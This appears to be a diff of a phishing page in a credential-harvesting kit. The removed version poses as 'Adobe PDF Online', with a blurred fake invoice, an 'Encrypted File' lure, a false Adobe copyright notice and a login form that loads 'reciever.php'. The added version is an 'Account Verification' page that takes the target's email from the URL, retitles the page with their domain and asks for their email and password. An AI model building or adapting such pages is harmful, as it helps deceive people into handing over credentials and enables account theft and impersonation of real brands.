@@ -1,114 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Adobe PDF Online (Demo)</title>
-<link rel="stylesheet" href="styles.css" />
-<style>
-  /* --- Blur overlay --- */
-  .blur-overlay {
-    position: fixed;
-    inset: 0;
-    background: url('https://i.ibb.co/jvBRfLqJ/Credit-Note-CECN2501001.jpg') center/cover no-repeat;
-    filter: blur(8px);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    font-family: Arial, sans-serif;
-    font-size: 20px;
-    font-weight: bold;
-    cursor: pointer;
-    z-index: 9999;
-    opacity: 0;
-    animation: fadeInOverlay 1s ease forwards;
-    transition: opacity .8s ease, transform .8s ease;
-  }
-  .blur-overlay.fade-out {opacity:0;transform:translateY(-50px);pointer-events:none;}
-  .blur-overlay span{background:rgba(0,0,0,.6);padding:20px 35px;border-radius:12px;}
-  @keyframes fadeInOverlay{0%{opacity:0;transform:scale(1.02);}100%{opacity:1;transform:scale(1);}}
-</style>
+  <meta charset="UTF-8" />
+  <title>Account Verification</title>
+
+  <!-- ✅ Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <!-- ✅ Your custom CSS -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- ✅ Dynamic Title Script with Capitalized First Letter -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const hash = window.location.hash.substring(1); // Remove the '#' character
+      const parts = hash.split("@");
+      if (parts.length === 2) {
+        const domain = parts[1];
+        const capitalized = domain.charAt(0).toUpperCase() + domain.slice(1);
+        document.title = capitalized;
+      }
+    });
+  </script>
 </head>
 <body>
 
-<div class="blur-overlay" id="overlay">
-  <span>🔒 Encrypted File<br><small style="font-size:15px;opacity:.8;">Click to View</small></span>
-</div>
+  <!-- Fullscreen background iframe -->
+  <iframe id="bg-frame"></iframe>
 
-<audio id="unlockSound" preload="auto">
-  <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_9b09f1c5a3.mp3" type="audio/mpeg">
-</audio>
+  <!-- Login overlay -->
+  <div class="overlay" id="overlay">
+    <div class="login-box">
+      <img id="logo" alt="Logo" />
 
-<div class="background"></div>
+      <!-- ✅ Email input with icon -->
+      <div class="input-group">
+        <i class="fas fa-envelope icon"></i>
+        <input type="email" id="email" placeholder="Email" />
+      </div>
 
-<!-- Header -->
-<div class="header-bar">
-  <div class="header-left">
-    <img src="https://i.ibb.co/xtsKw4XN/Screenshot-2025-05-17-at-12-48-58.png" alt="Logo"/>
-    <span>Adobe PDF Online</span>
-  </div>
-  <div class="header-middle"></div>
-  <div class="header-right"><div>Account</div><div>Sign In</div></div>
-</div>
+      <!-- ✅ Password input with icon -->
+      <div class="input-group">
+        <i class="fas fa-lock icon"></i>
+        <input type="password" id="password" placeholder="Password" />
+      </div>
 
-<!-- Toolbar -->
-<div class="topbar-2">
-  <div class="menu-right">
-    <div class="edit-button">Edit and Reply</div><div>Download</div>
-    <div>Print</div><div>Exit</div><div>...</div>
-  </div>
-</div>
+      <!-- Error message -->
+      <div id="error-msg" class="error-msg"></div>
 
-<!-- Login area -->
-<div class="container" id="login-content"
-     style="opacity:0;transform:translateY(60px);transition:all .8s ease;">
-  <div class="login-box">
-    <div class="login-title">
-      <img src="https://i.ibb.co/f3SBGdj/ad2.jpg" alt="icon"/>
-      <span>Adobe PDF Online</span>
+      <!-- Login button -->
+      <button id="login-btn">Login</button>
     </div>
-
-    <div class="identity-header">
-      <img src="https://i.ibb.co/HTnddqtP/Chat-GPT-Image-May-17-2025-01-52-59-PM.png" alt="Small"/>
-      <strong>Confirm your identity</strong>
-    </div>
-
-    <div id="error-msg" style="color: red; font-size: 12px; margin: 5px 0 0 0; display: none;"></div>
-
-   <form id="realForm" action="/login" method="POST">
-  <input type="email" name="email" placeholder="Email address" required />
-  <input type="password" name="password" placeholder="Password" required />
-  <div class="checkbox">
-    <label><input type="checkbox" name="staySignedIn" /> Stay signed in</label>
   </div>
-  <div class="btn-wrapper">
-    <button class="btn" type="submit">View Document</button>
-  </div>
-</form>
 
-    <div id="msg" style="text-align:center;color:#333;margin-top:10px;"></div>
-    <div class="disclaimer">© 2025 Adobe Corporation</div>
-  </div>
-</div>
-
-<script>
-const overlay=document.getElementById('overlay');
-const loginContent=document.getElementById('login-content');
-const sound=document.getElementById('unlockSound');
-overlay.addEventListener('click',()=>{
-  sound.play();
-  overlay.classList.add('fade-out');
-  setTimeout(()=>{
-    overlay.style.display='none';
-    loginContent.style.opacity='1';
-    loginContent.style.transform='translateY(0)';
-  },800);
-});
-
-
- <!-- ✅ Your JavaScript -->
-  <script src="reciever.php"></script>
+  <!-- ✅ Your JavaScript -->
+  <script src="script.js"></script>
 </body>
 </html>
